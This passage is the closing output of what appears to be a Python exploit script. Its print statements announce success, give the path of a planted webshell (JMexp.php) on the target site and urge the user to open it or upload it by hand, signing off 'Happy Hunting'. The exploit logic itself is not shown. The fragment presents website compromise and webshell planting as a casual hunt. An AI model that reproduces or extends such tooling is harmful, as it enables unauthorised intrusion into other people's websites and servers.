print ""
print "  >> All done ! Job Success !"
print ""
print "  >> Webshell at " + site + "/JMexp.php"
print ""
print "  >> Go on and Open webshell to use more! "
print ""
print "  >> If webshell not uploaded you can do it by youself."
print ""
print "  >> Happy Hunting! :P"
print ""
